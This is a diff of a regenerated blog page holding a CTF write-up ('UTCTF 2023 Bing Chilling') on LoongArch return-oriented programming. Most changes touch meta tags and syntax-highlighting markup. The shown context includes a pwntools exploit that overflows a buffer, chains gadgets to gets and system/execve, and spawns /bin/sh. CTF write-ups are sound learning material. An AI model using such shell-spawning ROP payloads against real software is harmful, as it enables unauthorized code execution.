@@ -16,21 +16,22 @@
         document.documentElement.setAttribute('data-theme', 'light');
       }
     })();
-  </script><!-- Begin Jekyll SEO tag v2.8.0 -->
+  </script><!-- Begin Jekyll SEO tag v2.9.0 -->
 <title>UTCTF 2023 Bing Chilling | Y²的博客</title>
-<meta name="generator" content="Jekyll v3.10.0" />
+<meta name="generator" content="Jekyll v4.4.1" />
 <meta property="og:title" content="UTCTF 2023 Bing Chilling" />
 <meta name="author" content="Y² (aka.cameudis)" />
 <meta property="og:locale" content="en_US" />
 <meta name="description" content="Loongarch ROP" />
-<meta property="og:description" content="Loongarch ROP" />
+<meta name="twitter:description" property="og:description" content="Loongarch ROP" />
 <link rel="canonical" href="https://www.cameudis.com/2023/04/04/Bing-Chilling.html" />
 <meta property="og:url" content="https://www.cameudis.com/2023/04/04/Bing-Chilling.html" />
 <meta property="og:site_name" content="Y²的博客" />
 <meta property="og:type" content="article" />
 <meta property="article:published_time" content="2023-04-04T21:19:34+08:00" />
+<meta property="article:modified_time" content="2023-04-04T21:19:34+08:00" />
 <meta name="twitter:card" content="summary" />
-<meta property="twitter:title" content="UTCTF 2023 Bing Chilling" />
+<meta name="twitter:title" content="UTCTF 2023 Bing Chilling" />
 <script type="application/ld+json">
 {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Y² (aka.cameudis)"},"dateModified":"2023-04-04T21:19:34+08:00","datePublished":"2023-04-04T21:19:34+08:00","description":"Loongarch ROP","headline":"UTCTF 2023 Bing Chilling","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.cameudis.com/2023/04/04/Bing-Chilling.html"},"url":"https://www.cameudis.com/2023/04/04/Bing-Chilling.html"}</script>
 <!-- End Jekyll SEO tag -->
@@ -578,38 +579,38 @@ make
 
 
 <span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>
-    <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="mi">72</span>
-    <span class="n">payload</span> <span class="o">+=</span> <span class="n">flat</span><span class="p">([</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span> <span class="o">*</span> <span class="mi">72</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="nf">flat</span><span class="p">([</span>
         <span class="n">g2</span><span class="p">,</span>
         <span class="mi">0</span><span class="p">,</span> <span class="n">gets_addr</span><span class="p">,</span> <span class="mi">0</span>
     <span class="p">])</span>
-    <span class="n">payload</span> <span class="o">+=</span> <span class="n">flat</span><span class="p">([</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="nf">flat</span><span class="p">([</span>
         <span class="n">g1</span><span class="p">,</span>
         <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
     <span class="p">])</span>
-    <span class="n">payload</span> <span class="o">+=</span> <span class="n">flat</span><span class="p">([</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="nf">flat</span><span class="p">([</span>
         <span class="n">g3</span><span class="p">,</span>
         <span class="mi">0</span><span class="p">,</span> <span class="n">buf_addr</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
         <span class="n">g2</span><span class="p">,</span>
         <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
     <span class="p">])</span>
-    <span class="n">payload</span> <span class="o">+=</span> <span class="n">flat</span><span class="p">([</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="nf">flat</span><span class="p">([</span>
         <span class="mi">0</span><span class="p">,</span> <span class="n">sys</span><span class="p">,</span> <span class="mi">0</span>
     <span class="p">])</span>
-    <span class="n">payload</span> <span class="o">+=</span> <span class="n">flat</span><span class="p">([</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="nf">flat</span><span class="p">([</span>
         <span class="n">g1</span><span class="p">,</span>
         <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
     <span class="p">])</span>
-    <span class="n">payload</span> <span class="o">+=</span> <span class="n">flat</span><span class="p">([</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="nf">flat</span><span class="p">([</span>
         <span class="n">g3</span><span class="p">,</span>
         <span class="mi">0</span><span class="p">,</span> <span class="n">buf_addr</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">221</span><span class="p">,</span>
         <span class="n">g2</span><span class="p">,</span>
         <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
     <span class="p">])</span>
 
-    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
-    <span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+    <span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sh">"</span><span class="s">/bin/sh</span><span class="se">\x00</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
 </code></pre></div></div>
 
           </div>
@@ -627,6 +628,14 @@ make
       <h3 class="related-posts-title">RELATED POSTS</h3>
       <div class="related-posts-list">
         
+    
+      
+        
+        
+        
+
+        
+      
     
       
         
